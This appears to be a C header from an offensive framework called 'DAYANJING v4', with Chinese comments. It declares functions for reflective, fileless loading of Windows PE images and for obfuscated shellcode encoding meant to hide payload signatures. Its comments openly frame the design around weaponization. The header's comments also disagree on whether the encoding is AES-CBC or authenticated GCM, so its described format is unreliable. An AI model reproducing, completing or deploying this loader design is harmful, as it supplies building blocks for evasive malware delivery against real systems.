/*
 * DAYANJING v4 — 17_loader
 *
 * 执行 / Loader 层：PE 解析、反射加载（无文件执行）、shellcode 编解码。
 *
 * 设计原则：
 *   - 不依赖 OpenSSL / Windows SDK；纯 C11，可在 Linux 上编译并验证逻辑
 *   - 反射加载面向 PE32/PE32+，在调用方提供的内存区域上完成：
 *       头拷贝 -> 节区拷贝 -> 基址重定位 -> IAT 绑定 -> TLS 回调收集
 *     Windows 代码的实际执行需要目标平台；本层在 Linux 上可验证到
 *     "内存映像构造正确"这一层（纯逻辑，可测）。
 *   - shellcode 编码采用两层：AES-128-CBC（复用 00_crypto 自研 AES）
 *     + 基于种子派生的 XOR 流混淆，避免明文特征直接暴露。
 */

#ifndef DAYANJING_LOADER_H
#define DAYANJING_LOADER_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ====================================================================
 * 公共返回码
 * ==================================================================== */
#define LD_OK           0
#define LD_ERR_ARG     -1    /* 参数非法（NULL / 长度 0） */
#define LD_ERR_TRUNC   -2    /* 缓冲区不足或越界 */
#define LD_ERR_FORMAT  -3    /* 结构不符合预期（magic / 字段非法） */
#define LD_ERR_NOTFOUND -4   /* 未找到 */
#define LD_ERR_NOSPACE -5    /* 输出空间不足 */
#define LD_ERR_AUTH   -6    /* 认证失败：密文/IV/tag 被篡改或密钥不符 */

/* PE_* 为历史别名，保持与既有代码一致 */
#define PE_OK          LD_OK
#define PE_ERR_ARG     LD_ERR_ARG
#define PE_ERR_TRUNC   LD_ERR_TRUNC
#define PE_ERR_FORMAT  LD_ERR_FORMAT
#define PE_ERR_NOTFOUND LD_ERR_NOTFOUND

/* ====================================================================
 * PE 解析
 * ==================================================================== */

#define PE_DOS_MAGIC    0x5A4Du   /* 'MZ' */
#define PE_NT_SIG       0x00004550u /* 'PE\0\0' */
#define PE_OPT_MAGIC32  0x010Bu
#define PE_OPT_MAGIC64  0x020Bu

#define PE_DIR_EXPORT   0
#define PE_DIR_IMPORT   1
#define PE_DIR_RELOC    5
#define PE_DIR_TLS      9
#define PE_NUM_DIRS     16

#define PE_SEC_NAME_LEN 8
#define PE_MAX_SEC      96

#define PE_IMPORT_DLL_MAX  128
#define PE_IMPORT_FUNC_MAX 256

typedef struct {
    uint8_t  name[PE_SEC_NAME_LEN];
    uint32_t vsize;
    uint32_t vaddr;
    uint32_t raw_size;
    uint32_t raw_ptr;
    uint32_t chars;
} pe_sec_t;

typedef struct {
    uint32_t rva;
    uint32_t size;
} pe_dir_t;

typedef struct {
    const uint8_t *buf;      /* 不拥有，调用方保证生命周期 */
    size_t         len;
    int            is64;
    uint16_t       machine;
    uint16_t       nsec;     /* COFF 声明的节数 */
    uint16_t       opt_size;
    uint16_t       chars;
    uint64_t       image_base;
    uint32_t       entry_rva;
    uint32_t       size_image;
    uint32_t       size_headers;
    uint32_t       sect_align;
    uint32_t       file_align;
    uint16_t       nrva;     /* NumberOfRvaAndSizes */
    pe_dir_t       dir[PE_NUM_DIRS];
    uint16_t       sec_count;
    pe_sec_t       secs[PE_MAX_SEC];
} pe_image_t;

int pe_parse(const uint8_t *buf, size_t len, pe_image_t *img);

/* RVA -> 文件偏移。头部区域按恒等映射（PE 规范）。 */
int pe_rva_to_file(const pe_image_t *img, uint32_t rva, uint32_t *off);

const pe_sec_t *pe_sec_by_rva(const pe_image_t *img, uint32_t rva);

/* 返回映像在内存中所需的字节数（按 SectionAlignment 向上取整） */
uint32_t pe_virtual_size(const pe_image_t *img);

/* ---- 导入表迭代 ---- */
typedef struct {
    const pe_image_t *img;
    uint32_t desc_off;      /* 当前导入描述符的文件偏移 */
    uint32_t ilt_off;       /* 当前 ILT 的文件偏移 */
    uint32_t iat_off;       /* 当前 IAT 的文件偏移 */
    uint32_t iat_rva;       /* 当前 IAT 的 RVA（写入 region 时用） */
    size_t   idx;           /* 当前 thunk 下标 */
    uint32_t iat_slot;      /* 当前 thunk 对应的 IAT 槽位文件偏移 */
    char     dll[PE_IMPORT_DLL_MAX];
    char     func[PE_IMPORT_FUNC_MAX];
    uint16_t hint;
    int      by_ordinal;
    uint16_t ordinal;
} pe_import_iter_t;

int pe_import_begin(const pe_image_t *img, pe_import_iter_t *it);
/* 返回 1 = 取得一项；0 = 迭代结束；<0 = 错误 */
int pe_import_next(pe_import_iter_t *it);

/* ---- 导出表 ---- */
int pe_export_count(const pe_image_t *img, uint32_t *nfunc, uint32_t *nnames);
int pe_export_rva_by_index(const pe_image_t *img, uint32_t idx, uint32_t *rva);
int pe_export_name_by_index(const pe_image_t *img, uint32_t idx,
                            char *name, size_t cap, uint32_t *ordinal);
int pe_export_by_name(const pe_image_t *img, const char *name, uint32_t *rva);

/* ====================================================================
 * 反射加载
 * ==================================================================== */

#define REFLECT_MAX_TLS 32

/*
 * 导入解析回调。实现方（宿主）负责把 (dll, func) 映射到一个地址。
 * 返回 LD_OK 并写出 *out 表示解析成功。
 */
typedef int (*reflect_resolve_fn)(const char *dll, const char *func,
                                  uint16_t ordinal, int by_ordinal,
                                  void *ud, uint64_t *out);

typedef struct {
    uint8_t *base;
    size_t   region_size;
    uint64_t entry_va;      /* base + entry_rva；无入口则为 0 */
    int64_t  delta;         /* (uintptr)base - ImageBase */
    uint32_t n_reloc;       /* 已修正的重定位项数 */
    uint32_t n_import;      /* 已绑定的 IAT 项数 */
    uint64_t tls_cb[REFLECT_MAX_TLS];
    size_t   n_tls;
} reflect_image_t;

/*
 * 在 region 上完成一次完整反射加载。
 * region_size 必须 >= pe_virtual_size(img)。
 */
int reflect_load(const uint8_t *pe_buf, size_t pe_len,
                 uint8_t *region, size_t region_size,
                 reflect_resolve_fn res, void *ud,
                 reflect_image_t *out);

/* 也可分步调用 */
int reflect_map_sections(const pe_image_t *img, uint8_t *region, size_t region_size);
int reflect_relocate(const pe_image_t *img, uint8_t *region, size_t region_size,
                     int64_t delta, uint32_t *nfixed);
int reflect_bind_imports(const pe_image_t *img, uint8_t *region, size_t region_size,
                         reflect_resolve_fn res, void *ud, uint32_t *n);
int reflect_collect_tls(const pe_image_t *img, uint8_t *region, size_t region_size,
                        uint64_t *cbs, size_t cap, size_t *n);

/* 小端读写助手：避免未对齐访问与严格别名问题 */
uint32_t ld_rd32(const uint8_t *p);
uint64_t ld_rd64(const uint8_t *p);
void     ld_wr32(uint8_t *p, uint32_t v);
void     ld_wr64(uint8_t *p, uint64_t v);

/* ====================================================================
 * shellcode 编解码
 * ==================================================================== */

#define SC_IV_LEN   12   /* GCM 推荐 IV 长度（96 位） */
#define SC_KEY_LEN  16
#define SC_TAG_LEN  16   /* GCM tag */
#define SC_HDR_LEN  24   /* magic4 + ver1 + flags1 + rsv2 + orig_len4 + iv12 */

/*
 * 载荷格式（ver = 2）：
 *   [ hdr 24B ] [ tag 16B ] [ ct nB ]     后 16+n 字节整体再做 XOR 混淆
 *   hdr = magic | ver | flags | rsv | orig_len(LE) | iv
 *   AAD = hdr 的前 12 字节（magic/ver/flags/rsv/orig_len）
 *
 * 为什么用 AEAD 而不是 CBC：
 *   CBC 无完整性保护，篡改密文只会静默产生错误明文（填充恰好合法时
 *   甚至不报错）。载荷被篡改而不被发现，对武器化是不可接受的。
 */

/* 编码后所需字节数；返回 0 表示参数非法 */
size_t sc_encode_size(size_t in_len);

/*
 * 编码：AES-128-CBC(PKCS#7) 后叠加 XOR 流混淆。
 * key = HKDF(ikm=seed, info="dayanjing:sc:key:v1", 16)
 * xor = HKDF(salt=iv, ikm=seed, info="dayanjing:sc:xor:v1", ct_len)
 * out 容量由 sc_encode_size(in_len) 给出；*out_len 入参为容量，出参为实际写入。
 */
int sc_encode(const uint8_t *in, size_t in_len,
              const uint8_t *seed, size_t seed_len,
              const uint8_t iv[SC_IV_LEN],
              uint8_t *out, size_t *out_len);

/*
 * 解码：逆序。校验 magic/版本、填充、原始长度。
 * *out_len 入参为 out 容量，出参为还原出的明文长度。
 */
int sc_decode(const uint8_t *blob, size_t blob_len,
              const uint8_t *seed, size_t seed_len,
              uint8_t *out, size_t *out_len);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_LOADER_H */
